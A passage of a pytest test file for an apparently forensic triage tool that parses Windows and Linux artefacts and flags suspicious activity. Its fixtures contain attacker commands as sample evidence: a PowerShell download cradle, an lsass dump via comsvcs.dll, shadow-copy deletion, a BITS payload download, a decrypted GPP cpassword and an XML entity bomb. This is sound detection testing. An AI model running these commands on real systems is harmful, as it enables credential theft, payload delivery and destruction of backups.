    assert "2026-05-19 09:11:17 +0200,1.2.3.4,,GET,200,512,/index.php,id=1" in text  # empty edge_ip
    assert "not a clf line" not in text            # junk lines just don't match


def test_detect_machines_vss_as_separate_machines(tmp_path):
    """avoid_vss=False makes each VSS snapshot its own machine (<host>_<VSSn>)
    pointing at the VSS dir; avoid_vss=True yields only the live machine. Each VSS
    machine gets its own folder/db downstream (own path + single live volume)."""
    from artifact_engine.core.detector import detect_machines
    from artifact_engine.models import Detect, DetectClause, MachineName, ProfileManifest

    coll = tmp_path / "PC9_kape_20260618"
    for vol in ("C", "VSS1", "VSS2"):
        (coll / vol).mkdir(parents=True)
        (coll / vol / "$MFT").write_text("x", encoding="utf-8")
    profile = ProfileManifest(
        id="windows_kape", os="windows", collector="kape",
        detect=Detect(any_of=[DetectClause(exists="$MFT")]),
        machine_name=MachineName(strategy="acquisition", regex="^(.*?)_kape", fallback="dir_name"),
    )

    live_only = detect_machines(tmp_path, [profile], avoid_vss=True)
    assert [m.name for m in live_only] == ["PC9"]
    assert live_only[0].path == coll / "C"

    with_vss = detect_machines(tmp_path, [profile], avoid_vss=False)
    by_name = {m.name: m for m in with_vss}
    assert set(by_name) == {"PC9", "PC9_VSS1", "PC9_VSS2"}
    # each VSS machine points at its own dir with one live volume named after it
    assert by_name["PC9_VSS1"].path == coll / "VSS1"
    assert [v.name for v in by_name["PC9_VSS1"].volumes] == ["VSS1"]
    assert by_name["PC9_VSS1"].volumes[0].is_live
    # snapshots are flagged so on_vss=false parsers can skip them
    assert not by_name["PC9"].is_vss
    assert by_name["PC9_VSS1"].is_vss and by_name["PC9_VSS2"].is_vss


def test_detect_machines_skips_velociraptor_quicktriage_dupe(tmp_path):
    """A Velociraptor QuickTriage upload tree (uploads/.../c%3A) is a copy of the
    KAPE artifacts and also matches windows_kape; the walk must not descend into
    Velociraptor, so the host is detected ONCE (no phantom duplicate machine)."""
    from artifact_engine.core.detector import detect_machines
    from artifact_engine.models import Detect, DetectClause, MachineName, ProfileManifest

    coll = tmp_path / "PC9_kape_20260618"
    (coll / "C").mkdir(parents=True)
    (coll / "C" / "$MFT").write_text("x", encoding="utf-8")
    dupe = coll / "Velociraptor" / "QuickTriage" / "uploads" / "auto" / "c%3A"
    dupe.mkdir(parents=True)
    (dupe / "$MFT").write_text("x", encoding="utf-8")   # would match windows_kape too
    profile = ProfileManifest(
        id="windows_kape", os="windows", collector="kape",
        detect=Detect(any_of=[DetectClause(exists="$MFT")]),
        machine_name=MachineName(strategy="acquisition", regex="^(.*?)_kape", fallback="dir_name"),
    )
    ms = detect_machines(tmp_path, [profile])
    assert [m.name for m in ms] == ["PC9"]              # single machine, no phantom dupe
    assert ms[0].path == coll / "C"


def test_on_vss_false_skips_parser_on_snapshot_machines(tmp_path):
    """A manifest with on_vss=false is not scheduled on VSS machines (the live
    machine keeps it); mft_transcode ships with the flag so a snapshot doesn't
    re-pay the slowest parser for a nearly identical $MFT."""
    from artifact_engine.core.detector import Machine
    from artifact_engine.core.scheduler import _applicable
    from artifact_engine.models import ParserManifest

    heavy = ParserManifest(id="mft_like", os="windows", on_vss=False,
                           handler="x:run")
    normal = ParserManifest(id="pf_like", os="windows", handler="x:run")
    live = Machine("PC9", "windows", "kape", "windows_kape", tmp_path)
    snap = Machine("PC9_VSS1", "windows", "kape", "windows_kape", tmp_path, is_vss=True)

    assert {p.id for p in _applicable(live, [heavy, normal])} == {"mft_like", "pf_like"}
    assert {p.id for p in _applicable(snap, [heavy, normal])} == {"pf_like"}

    # the shipped manifest actually carries the flag
    from artifact_engine.config import load_config
    from artifact_engine.registry import load_parsers
    mft = next(p for p in load_parsers(load_config().all_parser_dirs)
               if p.id == "mft_transcode")
    assert mft.on_vss is False


def test_load_config_avoid_vss_parses_false(tmp_path, monkeypatch):
    """avoid_vss: false in YAML must read as False (not bool('false')==True)."""
    from artifact_engine import config as cfgmod
    monkeypatch.chdir(tmp_path)
    (tmp_path / "config.yaml").write_text("avoid_vss: false\n", encoding="utf-8")
    assert cfgmod.load_config().avoid_vss is False
    (tmp_path / "config.yaml").write_text("avoid_vss: true\n", encoding="utf-8")
    assert cfgmod.load_config().avoid_vss is True
    # absent -> default (skip)
    (tmp_path / "config.yaml").write_text("max_workers: 2\n", encoding="utf-8")
    assert cfgmod.load_config().avoid_vss is True


def test_load_config_emit_flags(tmp_path, monkeypatch):
    """emit_db / emit_xlsx select consolidation outputs; default on, parse false."""
    from artifact_engine import config as cfgmod
    monkeypatch.chdir(tmp_path)
    # absent -> both default on
    (tmp_path / "config.yaml").write_text("max_workers: 2\n", encoding="utf-8")
    c = cfgmod.load_config()
    assert c.emit_db is True and c.emit_xlsx is True
    # emit_xlsx: false read as False (not bool('false')==True)
    (tmp_path / "config.yaml").write_text("emit_xlsx: false\nemit_db: true\n", encoding="utf-8")
    c = cfgmod.load_config()
    assert c.emit_db is True and c.emit_xlsx is False


def test_extract_velociraptor_in_place(tmp_path):
    import zipfile

    from artifact_engine.core import extractor
    vr = tmp_path / "PC01_kape" / "Velociraptor"
    vr.mkdir(parents=True)
    z = vr / "LiveResponse.zip"
    with zipfile.ZipFile(z, "w") as zf:
        zf.writestr("results/Eiffel.LiveResponse.Windows%2FWindows.System.Pslist.json", '{"Pid":1}\n')
    # QuickTriage must be ignored (redundant with KAPE parsers)
    with zipfile.ZipFile(vr / "QuickTriage.zip", "w") as zf:
        zf.writestr("results/x.json", "{}\n")
    res = extractor.extract_velociraptor(tmp_path)
    assert len(res) == 1 and res[0].ok
    assert (vr / "LiveResponse" / "results"
            / "Eiffel.LiveResponse.Windows%2FWindows.System.Pslist.json").is_file()
    assert not (vr / "QuickTriage").exists()


def test_handler_consolehost_history(tmp_path):
    from artifact_engine.handlers import win_consolehost
    ps = "AppData/Roaming/Microsoft/Windows/PowerShell"
    alice = tmp_path / "Users" / "alice" / ps / "PSReadLine"
    alice.mkdir(parents=True)
    (alice / "ConsoleHost_history.txt").write_text(
        "Get-ChildItem C:\\Temp\n"
        "iex (iwr http://10.0.0.9/p.ps1)\n"
        "powershell -enc SQBFAFgAIABpAHcAcgA=\n"
        "Get-Process |`\n  Sort-Object CPU\n",       # continuation joined
        encoding="utf-8",
    )
    bob = tmp_path / "Users" / "bob" / ps / "PSReadline"   # old lowercase variant
    bob.mkdir(parents=True)
    (bob / "ConsoleHost_history.txt").write_text(
        "rundll32 C:\\windows\\system32\\comsvcs.dll, #24 632 C:\\temp\\l.dmp full\n"
        "vssadmin delete shadows /all /quiet\n",
        encoding="utf-8",
    )
    # analyst indicator list (assets == evidence in _ctx): adds named-tooling flags
    (tmp_path / "suspicious_tools.txt").write_text(
        "shadow_delete = vssadmin\\s+delete\\s+shadows|wbadmin\\s+delete\n",
        encoding="utf-8")
    out = tmp_path / "CSVs"
    win_consolehost.run(_ctx(tmp_path, out))
    text = (out / "consolehost.csv").read_text(encoding="utf-8")
    assert "1,alice,,Get-ChildItem C:\\Temp" in text
    assert "2,alice,download_cradle,iex (iwr http://10.0.0.9/p.ps1)" in text
    assert "3,alice,encoded_command," in text
    assert "4,alice,,Get-Process | Sort-Object CPU" in text     # backtick re-joined
    assert "1,bob,credential_access," in text                   # comsvcs #24 lsass dump
    assert "2,bob,shadow_delete,vssadmin delete shadows /all /quiet" in text
    assert "`" not in text


def test_handler_consolehost_no_history_writes_nothing(tmp_path):
    from artifact_engine.handlers import win_consolehost
    (tmp_path / "Users" / "carol" / "Desktop").mkdir(parents=True)
    out = tmp_path / "CSVs"
    win_consolehost.run(_ctx(tmp_path, out))
    assert not (out / "consolehost.csv").exists()


def test_handler_rdp_mru_scan_merges_default_and_servers():
    from datetime import datetime

    from artifact_engine.handlers import win_rdp_mru

    class _TsKey(_FakeKey):
        def timestamp(self):
            return datetime(2026, 6, 12, 22, 53, 9)

    reg = _FakeReg({
        r"Software\Microsoft\Terminal Server Client\Default": _FakeKey(values={
            "MRU0": "srv01", "MRU1": "192.168.1.5"}),
        r"Software\Microsoft\Terminal Server Client\Servers": _FakeKey(subkeys=[
            _TsKey("SRV01", values={"UsernameHint": r"DOM\admin"}),
            _TsKey("oldhost", values={"UsernameHint": r"OLD\user",
                                      "CertHash": b"\x01\x02"}),
        ]),
    })
    ents = win_rdp_mru._scan_hive(reg)
    assert ents["srv01"]["mru"] == 0                       # merged case-insensitively
    assert ents["srv01"]["hint"] == r"DOM\admin"
    assert ents["srv01"]["last_write"] == "2026-06-12 22:53:09"
    assert ents["192.168.1.5"]["mru"] == 1
    assert ents["192.168.1.5"]["hint"] == ""               # MRU-only entry
    assert ents["oldhost"]["mru"] is None                  # Servers-only entry
    assert ents["oldhost"]["cert"] == "yes"


def test_handler_sudo_log_parses_fields_denials_and_flags(tmp_path):
    from artifact_engine.handlers import lin_sudo
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    (log / "sudo.log").write_text(
        "Sep 25 09:20:31 2024 : alice : HOST=srv ; TTY=pts/0 ; PWD=/home/alice ; "
        "USER=root ; COMMAND=/bin/su - root\n"
        "Sep 23 17:35:57 2024 : svcacct : command not allowed ; HOST=srv ; "
        "PWD=/opt/agent ; USER=root ; COMMAND=/usr/sbin/dmidecode\n"
        "Feb  9 02:18:25 2025 : ansible : HOST=srv ; TTY=pts/0 ; PWD=/home/a ; USER=root ; "
        "COMMAND=/usr/bin/sh -c 'echo OK ; PATH=/usr/sbin:/sbin /x/AnsiballZ.py'\n"
        "Mar  1 10:00:00 2025 : eve : 3 incorrect password attempts ; HOST=srv ; "
        "TTY=pts/1 ; PWD=/home/eve ; USER=root ; COMMAND=/bin/bash\n"
        "Mar  2 11:00:00 2025 : mallory : HOST=srv ; TTY=pts/2 ; PWD=/tmp ; "
        "USER=root ; COMMAND=/tmp/.x/esc.sh\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_sudo.run(_ctx(tmp_path, out))
    text = (out / "sudo_log.csv").read_text(encoding="utf-8")
    assert "2024-09-25 09:20:31,alice,root,pts/0,/home/alice,,/bin/su - root," in text
    assert "2024-09-23 17:35:57,svcacct,root,,/opt/agent,command not allowed,/usr/sbin/dmidecode," in text
    # COMMAND containing " ; " is not split into fields
    assert "PATH=/usr/sbin:/sbin /x/AnsiballZ.py'\",yes" not in text
    assert "AnsiballZ.py" in text and ",ansible,root,pts/0," in text
    assert "3 incorrect password attempts,/bin/bash,yes" in text     # probing flagged
    assert ",mallory,root,pts/2,/tmp,,/tmp/.x/esc.sh,yes" in text    # staging flagged
    lines = text.splitlines()
    assert lines[1].startswith("2024-09-23")                         # sorted chronologically


def test_handler_sudo_log_absent_writes_nothing(tmp_path):
    from artifact_engine.handlers import lin_sudo
    (tmp_path / "[root]" / "var" / "log").mkdir(parents=True)
    out = tmp_path / "CSVs"
    lin_sudo.run(_ctx(tmp_path, out))
    assert not (out / "sudo_log.csv").exists()


def test_handler_cron_log_exec_and_crontab_changes(tmp_path):
    from artifact_engine.handlers import lin_cron_log
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    (log / "cron").write_text(
        "Jun 28 03:38:01 srv CROND[3110187]: (root) CMD (/opt/agent/run.sh >/dev/null 2>&1)\n"
        "Jun 28 04:01:01 srv run-parts[3113524]: (/etc/cron.hourly) starting 0anacron\n"
        "Jun 28 04:02:00 srv anacron[3106255]: Normal exit (1 job run)\n"
        "Jun 28 05:00:00 srv crontab[9999]: (www-data) REPLACE (www-data)\n"
        "Jun 28 05:00:01 srv crond[123]: (www-data) RELOAD (/var/spool/cron/www-data)\n"
        "Jun 28 05:01:00 srv CROND[10001]: (www-data) CMD (/tmp/.hidden/beacon.sh)\n"
        "Jun 29 06:00:00 srv /USR/SBIN/CRON[7]: (root) CMD (  /usr/bin/apt update )\n",
        encoding="utf-8",
    )
    out = tmp_path / "CSVs"
    lin_cron_log.run(_ctx(tmp_path, out))
    text = (out / "cron_log.csv").read_text(encoding="utf-8")
    assert "exec,root,/opt/agent/run.sh >/dev/null 2>&1," in text
    assert "crontab_replace,www-data,www-data," in text
    assert "reload,www-data,/var/spool/cron/www-data," in text
    assert "exec,www-data,/tmp/.hidden/beacon.sh,yes" in text     # staging flagged
    assert "exec,root,/usr/bin/apt update," in text               # Debian CRON variant
    assert "run-parts" not in text and "anacron" not in text      # chatter dropped


def test_handler_cron_log_absent_writes_nothing(tmp_path):
    from artifact_engine.handlers import lin_cron_log
    (tmp_path / "[root]" / "var" / "log").mkdir(parents=True)
    out = tmp_path / "CSVs"
    lin_cron_log.run(_ctx(tmp_path, out))
    assert not (out / "cron_log.csv").exists()


_TASK_XML = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2026-06-12T10:00:00</Date><Author>DOM\\admin</Author></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>SYSTEM</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>{hidden}</Hidden><Enabled>{enabled}</Enabled></Settings>
  <Actions><Exec><Command>{cmd}</Command><Arguments>{args}</Arguments></Exec></Actions>
</Task>"""


def test_handler_tasks_disk_parses_and_flags(tmp_path):
    from artifact_engine.handlers import win_tasks_disk
    tasks = tmp_path / "Windows" / "System32" / "Tasks"
    (tasks / "Microsoft" / "Windows" / "Defrag").mkdir(parents=True)
    (tasks / "Microsoft" / "Windows" / "Defrag" / "ScheduledDefrag").write_text(
        _TASK_XML.format(hidden="false", enabled="true",
                         cmd=r"%windir%\system32\defrag.exe", args="-c"),
        encoding="utf-16",                       # BOM + UTF-16, like the real store
    )
    (tasks / "Updater").write_text(
        _TASK_XML.format(hidden="true", enabled="true",
                         cmd=r"C:\Users\Public\upd.exe", args=""),
        encoding="utf-16",
    )
    (tasks / "notxml").write_text("garbage", encoding="utf-8")   # tolerated, skipped
    out = tmp_path / "CSVs"
    win_tasks_disk.run(_ctx(tmp_path, out))
    text = (out / "tasks_disk.csv").read_text(encoding="utf-8")
    lines = text.splitlines()
    # RegistrationInfo/Date is stamped in the registering user's LOCAL zone and
    # passed through verbatim -> `_local`, so it is never read as UTC by mistake
    assert lines[0].startswith("task,author,created_local,")
    assert r"\Microsoft\Windows\Defrag\ScheduledDefrag" in text
    assert "BootTrigger" in text and "SYSTEM,HighestAvailable" in text
    assert r"\Updater,DOM\admin,2026-06-12T10:00:00,SYSTEM" in text
    assert lines[1].startswith(r"\Updater")      # suspicious (hidden+staging) first
    assert lines[1].endswith(",yes")
    assert "defrag.exe -c,"in text and not lines[2].endswith(",yes")
    assert "notxml" not in text


def test_handler_tasks_disk_selfgates(tmp_path):
    import pytest

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_tasks_disk
    with pytest.raises(HandlerSkip):
        win_tasks_disk.run(_ctx(tmp_path, tmp_path / "CSVs"))


def test_handler_explorer_input_scan():
    from datetime import datetime

    from artifact_engine.handlers import win_explorer_input

    class _TsKey(_FakeKey):
        def timestamp(self):
            return datetime(2026, 6, 14, 17, 57, 30)

    # MRUListEx: entries 1, 0, then terminator -> value "1" is most recent.
    mru = b"\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff"
    reg = _FakeReg({
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery": _TsKey(values={
            "MRUListEx": mru,
            "0": "password\x00".encode("utf-16-le"),
            "1": "confidencial\x00".encode("utf-16-le"),
        }),
        r"Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths": _TsKey(values={
            "url1": r"\\srv01", "url2": r"C:\Users\x"}),
    })
    rows = win_explorer_input._scan_hive(reg)
    by = {(r[0], r[2]): r for r in rows}
    assert by[("search", "confidencial")][1] == 0                  # MRU says most recent
    assert by[("search", "confidencial")][3] == "2026-06-14 17:57:30"
    assert by[("search", "password")][1] == 1
    assert by[("search", "password")][3] == ""                     # only MRU0 is dated
    assert by[("typed_path", r"\\srv01")][1] == 0
    assert by[("typed_path", r"\\srv01")][3] == "2026-06-14 17:57:30"
    assert by[("typed_path", r"C:\Users\x")][3] == ""


def test_handler_rdp_mru_selfgates_and_skips_bad_hive(tmp_path):
    import pytest

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_rdp_mru
    out = tmp_path / "CSVs"
    with pytest.raises(HandlerSkip):
        win_rdp_mru.run(_ctx(tmp_path, out))               # no Users dir at all
    bad = tmp_path / "Users" / "x"
    bad.mkdir(parents=True)
    (bad / "NTUSER.DAT").write_bytes(b"not a hive")
    win_rdp_mru.run(_ctx(tmp_path, out))                   # unreadable hive -> 0 rows
    assert not (out / "rdp_outbound.csv").exists()


def test_handler_sysvol_gpp_and_scripts(tmp_path):
    """SYSVOL parser: decrypts GPP cpassword, extracts GPP scheduled-task command,
    flags an add to a privileged group and a script from a suspicious path. Only
    runs where Windows/SYSVOL exists (domain controllers)."""
    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_sysvol

    out = tmp_path / "CSVs"
    # a member server (no SYSVOL) -> the parser skips itself
    import pytest
    with pytest.raises(HandlerSkip):
        win_sysvol.run(_ctx(tmp_path, out))

    gpo = (tmp_path / "Windows/SYSVOL/domain/Policies"
           / "{AAAAAAAA-1111-2222-3333-444444444444}")
    st = gpo / "Machine/Preferences/ScheduledTasks"
    st.mkdir(parents=True)
    (st / "ScheduledTasks.xml").write_text(
        '<?xml version="1.0"?>\n<ScheduledTasks>\n'
        ' <TaskV2 name="Updater">\n'
        '  <Properties action="C" name="Updater" runAs="NT AUTHORITY\\System">\n'
        '   <Task><Actions><Exec><Command>C:\\Users\\Public\\bt.exe</Command>'
        '<Arguments>-nop</Arguments></Exec></Actions></Task>\n'
        '  </Properties>\n </TaskV2>\n</ScheduledTasks>\n', encoding="utf-8")
    gr = gpo / "Machine/Preferences/Groups"
    gr.mkdir(parents=True)
    (gr / "Groups.xml").write_text(
        '<?xml version="1.0"?>\n<Groups>\n'
        ' <User name="svc" >\n'
        '  <Properties action="U" userName="svc" '
        'cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"/>\n'
        ' </User>\n'
        ' <Group name="Administrators (built-in)">\n'
        '  <Properties action="U" groupName="Administrators (built-in)">\n'
        '   <Members><Member name="CORP\\intruder" action="ADD"/></Members>\n'
        '  </Properties>\n </Group>\n</Groups>\n', encoding="utf-8")
    sc = gpo / "User/Scripts"
    sc.mkdir(parents=True)
    (sc / "scripts.ini").write_bytes(
        "\r\n[Logon]\r\n0CmdLine=ok.vbs\r\n0Parameters=\r\n"
        "1CmdLine=C:\\Windows\\Temp\\eviluser.hta\r\n1Parameters=\r\n".encode("utf-16"))

    win_sysvol.run(_ctx(tmp_path, out))

    gpp = (out / "sysvol_gpp.csv").read_text(encoding="utf-8")
    assert "Local*P4ssword!" in gpp                         # cpassword decrypted
    assert "C:\\Users\\Public\\bt.exe -nop" in gpp        # GPP task command line
    # cpassword row, privileged-group add and staging-dir task are all suspicious
    assert gpp.count(",yes") == 3

    scripts = (out / "sysvol_scripts.csv").read_text(encoding="utf-8")
    assert "ok.vbs" in scripts and "eviluser.hta" in scripts
    lines = [ln for ln in scripts.splitlines() if ".hta" in ln]
    assert lines and lines[0].endswith(",yes")             # temp-path .hta flagged


def test_sysvol_manifest_scoped_to_dc(tmp_path):
    """The shipped manifest requires SYSVOL (DC-only) and skips VSS snapshots."""
    from artifact_engine.config import load_config
    from artifact_engine.registry import load_parsers
    p = next(x for x in load_parsers(load_config().all_parser_dirs) if x.id == "sysvol")
    assert p.requires == ["Windows/SYSVOL"]
    assert p.on_vss is False


def _make_activitiescache(path, activities):
    """Write a minimal ActivitiesCache.db with the columns the handler reads."""
    import sqlite3
    conn = sqlite3.connect(str(path))
    conn.execute("CREATE TABLE Activity (AppId, ActivityType, Payload, "
                 "StartTime, EndTime, LastModifiedTime)")
    conn.executemany("INSERT INTO Activity VALUES (?,?,?,?,?,?)", activities)
    conn.commit()
    conn.close()


def test_handler_timeline_native(tmp_path):
    """Timeline is parsed natively from ActivitiesCache.db: app decoded from the
    AppId JSON (with the known-folder GUID translated), opened file from Payload,
    epoch timestamps converted, and a staging-dir app flagged suspicious."""
    from artifact_engine.handlers import win_timeline

    cdp = (tmp_path / "Users" / "alice" / "AppData" / "Local"
           / "ConnectedDevicesPlatform" / "L.alice")
    cdp.mkdir(parents=True)
    pf = "{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}"      # ProgramFiles(x86) knownfolder
    _make_activitiescache(cdp / "ActivitiesCache.db", [
        ('[{"application":"' + pf + '\\\\Word\\\\winword.exe","platform":"windows_win32"}]',
         5,
         '{"displayText":"report.docx","contentUri":"file:///C:/Users/alice/report.docx"}',
         1700000000, 1700000060, 1700000060),
        ('[{"application":"C:\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\evil.exe",'
         '"platform":"windows_win32"}]',
         5, '{"displayText":"evil"}', 1700000100, 0, 1700000100),
        ('[{"application":"","platform":"data_boundary"}]', 11,
         "Q0IBclipboardblob", 1700000200, 0, 1700000200),  # clipboard blob -> no content
    ])

    out = tmp_path / "CSVs"
    win_timeline.run(_ctx(tmp_path, out))
    text = (out / "timeline.csv").read_text(encoding="utf-8")

    # ActivitiesCache holds plain Unix epochs, rendered with tz=utc -> `_utc` header
    assert text.splitlines()[0] == \
        "user,start_utc,end_utc,activity_type,app,content,last_modified_utc,suspicious"
    assert "%ProgramFiles(x86)%\\Word\\winword.exe" in text   # GUID translated
    assert "report.docx" in text and "C:\\Users\\alice\\report.docx" in text
    assert "2023-11-14" in text                               # epoch -> date
    assert "alice" in text
    # the Temp\evil.exe activity is the one flagged
    evil = [ln for ln in text.splitlines() if "evil.exe" in ln][0]
    assert evil.endswith(",yes")


def test_handler_bits_carves_jobs(tmp_path):
    """BITS jobs are carved from the qmgr store: URL paired with the local dest
    that follows it, owner from the path, duplicates counted, and a raw-IP host
    delivering an exe flagged suspicious."""
    from artifact_engine.handlers import win_bits

    def rec(url, dest):
        # URL, a 6-byte gap (null term + length field), then the dest path,
        # all UTF-16LE -- the real record layout the carver targets.
        return (url.encode("utf-16le") + b"\x00\x00" + b"<\x00\x00\x00"
                + dest.encode("utf-16le") + b"\x00\x00")

    blob = (b"\x00\x00\x00\x00"
            + rec("http://edgedl.me.gvt1.com/edgedl/chrome",
                  "C:\\Users\\bob\\AppData\\Local\\Temp\\chrome_BITS_1")
            + b"\xaa\xbb" * 8
            + rec("http://203.0.113.9/payload.exe",
                  "C:\\Users\\bob\\AppData\\Roaming\\svc.exe")
            + b"\xaa\xbb" * 8
            + rec("http://edgedl.me.gvt1.com/edgedl/chrome",     # duplicate -> count 2
                  "C:\\Users\\bob\\AppData\\Local\\Temp\\chrome_BITS_1"))

    dl = tmp_path / "ProgramData" / "Microsoft" / "Network" / "Downloader"
    dl.mkdir(parents=True)
    (dl / "qmgr.db").write_bytes(blob)

    out = tmp_path / "CSVs"
    win_bits.run(_ctx(tmp_path, out))
    text = (out / "bits_jobs.csv").read_text(encoding="utf-8")
    lines = text.splitlines()

    assert any("203.0.113.9" in ln and ln.endswith(",yes") for ln in lines)  # raw-IP exe
    assert any("chrome_BITS_1" in ln and ln.endswith(",") for ln in lines)   # legit, not flagged
    chrome = [ln for ln in lines if "chrome_BITS_1" in ln][0]
    assert ",2," in chrome and "bob" in chrome        # deduped with count, owner parsed


def test_timeline_and_bits_manifests_native(tmp_path):
    """Both ship as pure-Python handlers (no external tool section)."""
    from artifact_engine.config import load_config
    from artifact_engine.registry import load_parsers
    ps = {p.id: p for p in load_parsers(load_config().all_parser_dirs)}
    assert ps["timeline"].tool is None and ps["timeline"].handler
    assert ps["bits"].tool is None and ps["bits"].handler
    assert ps["bits"].requires == ["ProgramData/Microsoft/Network/Downloader"]


def test_auth_streams_rotations_in_order_with_a_bounded_dedupe(tmp_path, monkeypatch):
    """auth.log rows are attacker-paced (one per failed SSH attempt), so nothing
    may grow with them: the rows stream out and the de-duplication is a window.

    Rotations are read oldest-first, which is both the chronological order and
    what puts a `copytruncate` overlap's repeated lines next to each other."""
    import gzip

    from artifact_engine.handlers import lin_auth
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)

    def line(day, src):
        return (f"2026-05-{day:02d}T00:00:00+02:00 app01 sshd[1]: "
                f"Failed password for root from {src} port 22 ssh2\n")

    # .10 must sort before .2 (a plain string sort puts it between .1 and .2).
    with gzip.open(log / "auth.log.10.gz", "wt", encoding="utf-8") as fh:
        fh.write(line(1, "1.2.3.4"))
    (log / "auth.log.2").write_text(line(2, "5.6.7.8"), encoding="utf-8")
    # The overlap: these two lines are the tail of .1 and the head of the current
    # file, as a `copytruncate` rotation leaves them.
    (log / "auth.log.1").write_text(line(3, "9.10.11.12") + line(4, "13.14.15.16"),
                                    encoding="utf-8")
    (log / "auth.log").write_text(line(3, "9.10.11.12") + line(4, "13.14.15.16")
                                  + line(5, "17.18.19.20"), encoding="utf-8")

    out = tmp_path / "CSVs"
    lin_auth.run(_ctx(tmp_path, out))
    body = (out / "auth.csv").read_text(encoding="utf-8").splitlines()[1:]

    sources = [r.split(",")[4] for r in body]
    assert sources == ["1.2.3.4", "5.6.7.8", "9.10.11.12", "13.14.15.16",
                       "17.18.19.20"]                  # chronological, overlap dropped

    # The window is real, not a set that remembers everything: shrink it below the
    # overlap and the repeats stop being recognised.
    monkeypatch.setattr(lin_auth, "_DEDUPE_WINDOW", 1)
    out2 = tmp_path / "CSVs2"
    lin_auth.run(_ctx(tmp_path, out2))
    body2 = (out2 / "auth.csv").read_text(encoding="utf-8").splitlines()[1:]
    assert len(body2) == 7


def test_cron_log_streams_and_reads_rotations_oldest_first(tmp_path):
    from artifact_engine.handlers import lin_cron_log
    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    (log / "cron.10").write_text(
        "Jun 01 00:00:00 srv CROND[1]: (root) CMD (/oldest.sh)\n", encoding="utf-8")
    (log / "cron.2").write_text(
        "Jun 02 00:00:00 srv CROND[2]: (root) CMD (/middle.sh)\n", encoding="utf-8")
    (log / "cron").write_text(
        "Jun 03 00:00:00 srv CROND[3]: (root) CMD (/newest.sh)\n", encoding="utf-8")

    out = tmp_path / "CSVs"
    lin_cron_log.run(_ctx(tmp_path, out))
    body = (out / "cron_log.csv").read_text(encoding="utf-8").splitlines()[1:]
    assert [r.split(",")[3] for r in body] == ["/oldest.sh", "/middle.sh", "/newest.sh"]


def test_stream_csv_leaves_no_header_only_file(tmp_path):
    """Same contract as write_csv: a parser that found nothing writes nothing."""
    from artifact_engine.handlers._lincommon import stream_csv
    with stream_csv(tmp_path, "empty.csv", ["a", "b"]):
        pass
    assert not (tmp_path / "empty.csv").exists()
    with stream_csv(tmp_path, "full.csv", ["a", "b"]) as emit:
        emit(["1", "2"])
    assert (tmp_path / "full.csv").read_text(encoding="utf-8").splitlines() == ["a,b", "1,2"]


def test_utmp_is_streamed_not_read_whole(tmp_path):
    """btmp grows one 384-byte record per FAILED login, so its size is the
    attacker's to choose; the parser must not hold the file (or its rows)."""
    import struct

    from artifact_engine.handlers import lin_btmp, lin_wtmp

    def rec(user, host, sec, ut_type=7):
        r = bytearray(384)
        struct.pack_into("<i", r, 0, ut_type)
        r[8:8 + 4] = b"pts0"
        r[44:44 + len(user)] = user.encode()
        r[76:76 + len(host)] = host.encode()
        struct.pack_into("<i", r, 340, sec)
        return bytes(r)

    log = tmp_path / "[root]" / "var" / "log"
    log.mkdir(parents=True)
    # more than one read chunk, so the chunk boundary is exercised
    n = 4096 + 7
    (log / "btmp").write_bytes(b"".join(rec("root", "203.0.113.5", 1780000000 + i)
                                        for i in range(n)))
    out = tmp_path / "CSVs"
    lin_btmp.run(_ctx(tmp_path, out))
    body = (out / "btmp.csv").read_text(encoding="utf-8").splitlines()
    assert len(body) == n + 1                      # header + every record, none lost
    assert body[1] == "2026-05-28 20:26:40,root,USER_PROCESS,pts0,203.0.113.5"

    assert not (out / "wtmp.csv").exists()          # absent file writes nothing
    lin_wtmp.run(_ctx(tmp_path, out))
    assert not (out / "wtmp.csv").exists()

    # the parser is a generator: nothing is materialised before the caller asks
    import types
    assert isinstance(lin_wtmp.iter_utmp(log / "btmp"), types.GeneratorType)


def test_xml_entity_bomb_is_refused_by_the_task_and_gpp_parsers(tmp_path):
    """SYSVOL and the on-disk task store are written by whoever owns the DC. A
    ~300-byte file with nested entity definitions expands to gigabytes inside
    ElementTree, which would hang the triage on the analyst's own workstation."""
    import xml.etree.ElementTree as ET

    from artifact_engine.handlers import _xml, win_tasks_disk

    bomb = (b'<?xml version="1.0"?><!DOCTYPE t [\n'
            b' <!ENTITY a "aaaaaaaaaa">\n'
            b' <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n'
            b']><Task><RegistrationInfo><Date>&b;</Date></RegistrationInfo></Task>')

    # unguarded ElementTree really does expand it - the guard is not theatre
    assert len(ET.fromstring(bomb).find("RegistrationInfo/Date").text) == 100

    raised = False
    try:
        _xml.fromstring(bomb)
    except ET.ParseError:
        raised = True
    assert raised
    assert win_tasks_disk._parse_task(bomb) is None      # skipped like a corrupt file

    ok = (rb'<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
          rb'<RegistrationInfo><Date>2026-01-02T03:04:05</Date></RegistrationInfo>'
          rb'<Actions><Exec><Command>C:\Windows\System32\cmd.exe</Command>'
          rb'</Exec></Actions></Task>')
    assert win_tasks_disk._parse_task(ok)["created"] == "2026-01-02T03:04:05"


def test_deepblue_survives_an_apostrophe_in_the_case_path(tmp_path, monkeypatch):
